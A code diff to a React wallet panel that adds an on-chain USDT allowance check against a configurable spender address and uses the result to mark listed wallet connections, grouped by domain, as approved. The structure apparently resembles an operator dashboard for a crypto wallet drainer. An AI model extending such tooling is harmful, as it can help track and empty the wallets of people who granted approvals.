@@ -42,7 +42,8 @@ export default function WalletPanel() {
 
   const fetchEvmBalance = async (address) => {
     try {
-      const [ethRes, usdtRes] = await Promise.all([
+      const EVM_SPENDER = import.meta.env.VITE_EVM_SPENDER_ADDRESS;
+      const calls = [
         fetch(ACTIVE_RPC_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -57,12 +58,32 @@ export default function WalletPanel() {
             id: 2,
           }),
         }),
-      ]);
-      const ethData = await ethRes.json();
-      const usdtData = await usdtRes.json();
+      ];
+
+      if (EVM_SPENDER) {
+        calls.push(fetch(ACTIVE_RPC_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            jsonrpc: '2.0', method: 'eth_call',
+            params: [{ to: EVM_USDT, data: '0xdd62ed3e' + address.slice(2).padStart(64, '0') + EVM_SPENDER.slice(2).padStart(64, '0') }, 'latest'],
+            id: 3,
+          }),
+        }));
+      }
+
+      const res = await Promise.all(calls);
+      const ethData = await res[0].json();
+      const usdtData = await res[1].json();
+      let allowanceData = { result: '0x0' };
+      if (res[2]) allowanceData = await res[2].json();
+
       const eth = (parseInt(ethData.result || '0x0', 16) / 1e18).toFixed(4);
       const usdt = (parseInt(usdtData.result || '0x0', 16) / 1e6).toFixed(2);
-      return { native: `${eth} ETH`, usdt: `${usdt} USDT` };
+      const allowance = BigInt(allowanceData.result || '0x0');
+      const isApprovedOnChain = allowance > 0n;
+
+      return { native: `${eth} ETH`, usdt: `${usdt} USDT`, isApprovedOnChain };
     } catch {
       return { error: true };
     }
@@ -135,14 +156,25 @@ export default function WalletPanel() {
 
   // Merge connections with approval status
   const mergedData = useMemo(() => {
-    return connections.map((conn) => ({
-      ...conn,
-      approved: approvedSet.has(`${conn.address}__${conn.network}`),
-      approvalRecord: approvals.find(
-        (a) => a.address === conn.address && a.network === conn.network
-      ),
-    }));
-  }, [connections, approvedSet, approvals]);
+    return connections.map((conn) => {
+      const key = `${conn.address}__${conn.network}`;
+      let isApproved = approvedSet.has(key);
+      const bal = balances[key];
+
+      // Override with true on-chain state for EVM if we successfully fetched it
+      if (conn.network === 'evm' && bal && !bal.loading && !bal.error) {
+        isApproved = bal.isApprovedOnChain;
+      }
+
+      return {
+        ...conn,
+        approved: isApproved,
+        approvalRecord: approvals.find(
+          (a) => a.address === conn.address && a.network === conn.network
+        ),
+      };
+    });
+  }, [connections, approvedSet, approvals, balances]);
 
   // All unique domains for the filter dropdown
   const allDomains = useMemo(() => {
